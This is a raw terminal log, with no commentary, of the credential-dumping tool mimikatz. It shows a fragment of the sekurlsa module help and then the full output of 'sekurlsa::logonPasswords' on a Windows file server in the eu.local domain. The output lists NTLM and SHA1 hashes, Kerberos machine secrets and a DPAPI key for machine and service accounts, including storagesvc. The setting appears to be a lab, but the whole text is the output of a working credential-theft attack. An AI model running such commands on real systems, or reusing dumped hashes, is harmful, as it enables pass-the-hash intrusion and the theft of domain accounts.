         opassth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
            keys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager

mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 1747270 (00000000:001aa946)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 4:07:59 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : 419757d1b609d9f8e211092272631abd
         * SHA1     : 0bc84f74a45db30eeb0c33488a882d65ee837462
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 14 85 35 de 36 a1 3b 10 a6 37 dc 07 4c 4b 4f 12 e6 71 e9 7e e9 79 e4 16 36 a6 04 57 68 aa 3f 78 41 7c a9 fa 5c c6 85 02 db e6 d0 8d 7f 5c 29 85 ed be d1 d3 62 5e 42 f8 3d 15 10 2b aa 9a f2 c5 48 2c 49 4b b0 a9 b3 3c 72 51 e5 83 00 f5 c9 fa 95 13 32 1e 16 50 3d be d3 27 1e 2d d3 2c 46 01 4d 46 ec 32 59 6f cf 64 68 02 d0 4e 92 b3 41 a1 f8 76 a2 1d c8 7e 77 b0 ba d9 83 0e 2f 59 67 61 7a 95 a1 4a 64 c3 9e 96 94 b6 a4 c6 a5 bf de 7b 76 cf 1e 42 bf 28 54 ae 33 b9 cb 0f 7b c6 d6 02 d2 1c 6d 2a a5 35 c6 37 79 ed b9 7d 29 b8 c1 ea 8f 18 9d 10 1c 5a 07 c3 74 db 60 76 bc 9d d7 a8 03 de 31 e6 e6 0b 47 7d 24 3e 84 60 12 6e 4a 68 aa d9 72 5a 24 4f 5a b6 df 1e de c9 19 78 c3 90 10 db 2d 34 15 74 7b 94 70 9f f4 80 5b 03 d8 b0
        ssp :
        credman :

Authentication Id : 0 ; 1747163 (00000000:001aa8db)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 4:07:59 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
        ssp :
        credman :

Authentication Id : 0 ; 27753 (00000000:00006c69)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               :
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 1742331 (00000000:001a95fb)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 4:07:59 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
        ssp :
        credman :

Authentication Id : 0 ; 29244 (00000000:0000723c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : EU-FILE$
Domain            : EU
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : eu-file$
         * Domain   : EU.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 49179 (00000000:0000c01b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : 419757d1b609d9f8e211092272631abd
         * SHA1     : 0bc84f74a45db30eeb0c33488a882d65ee837462
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 14 85 35 de 36 a1 3b 10 a6 37 dc 07 4c 4b 4f 12 e6 71 e9 7e e9 79 e4 16 36 a6 04 57 68 aa 3f 78 41 7c a9 fa 5c c6 85 02 db e6 d0 8d 7f 5c 29 85 ed be d1 d3 62 5e 42 f8 3d 15 10 2b aa 9a f2 c5 48 2c 49 4b b0 a9 b3 3c 72 51 e5 83 00 f5 c9 fa 95 13 32 1e 16 50 3d be d3 27 1e 2d d3 2c 46 01 4d 46 ec 32 59 6f cf 64 68 02 d0 4e 92 b3 41 a1 f8 76 a2 1d c8 7e 77 b0 ba d9 83 0e 2f 59 67 61 7a 95 a1 4a 64 c3 9e 96 94 b6 a4 c6 a5 bf de 7b 76 cf 1e 42 bf 28 54 ae 33 b9 cb 0f 7b c6 d6 02 d2 1c 6d 2a a5 35 c6 37 79 ed b9 7d 29 b8 c1 ea 8f 18 9d 10 1c 5a 07 c3 74 db 60 76 bc 9d d7 a8 03 de 31 e6 e6 0b 47 7d 24 3e 84 60 12 6e 4a 68 aa d9 72 5a 24 4f 5a b6 df 1e de c9 19 78 c3 90 10 db 2d 34 15 74 7b 94 70 9f f4 80 5b 03 d8 b0
        ssp :
        credman :

Authentication Id : 0 ; 49136 (00000000:0000bff0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : EU-FILE$
Domain            : EU
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : eu-file$
         * Domain   : EU.LOCAL
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
        ssp :
        credman :

Authentication Id : 0 ; 29265 (00000000:00007251)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : EU-FILE$
         * Domain   : EU
         * NTLM     : cb13975657590b7c342506e8e9d6ef39
         * SHA1     : 46346991bf219bef17f7b767906b57883c4e591e
        tspkg :
        wdigest :
         * Username : EU-FILE$
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
        ssp :
        credman :

Authentication Id : 0 ; 1876451 (00000000:001ca1e3)
Session           : RemoteInteractive from 2
User Name         : storagesvc
Domain            : EU
Logon Server      : EU-DC
Logon Time        : 12/26/2022 4:17:30 AM
SID               : S-1-5-21-3657428294-2017276338-1274645009-1106
        msv :
         [00000003] Primary
         * Username : storagesvc
         * Domain   : EU
         * NTLM     : 5c76877a9c454cded58807c20c20aeac
         * SHA1     : d162b0c23116ab6fd94c9066f08a8de3ebd433a1
         * DPAPI    : 613fc892fe0d9370e2590c4c8c7d4c6e
        tspkg :
        wdigest :
         * Username : storagesvc
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : storagesvc
         * Domain   : EU.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1876056 (00000000:001ca058)
Session           : RemoteInteractive from 2
User Name         : storagesvc
Domain            : EU
Logon Server      : EU-DC
Logon Time        : 12/26/2022 4:17:30 AM
SID               : S-1-5-21-3657428294-2017276338-1274645009-1106
        msv :
         [00000003] Primary
         * Username : storagesvc
         * Domain   : EU
         * NTLM     : 5c76877a9c454cded58807c20c20aeac
         * SHA1     : d162b0c23116ab6fd94c9066f08a8de3ebd433a1
         * DPAPI    : 613fc892fe0d9370e2590c4c8c7d4c6e
        tspkg :
        wdigest :
         * Username : storagesvc
         * Domain   : EU
         * Password : (null)
        kerberos :
         * Username : storagesvc
         * Domain   : EU.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

```
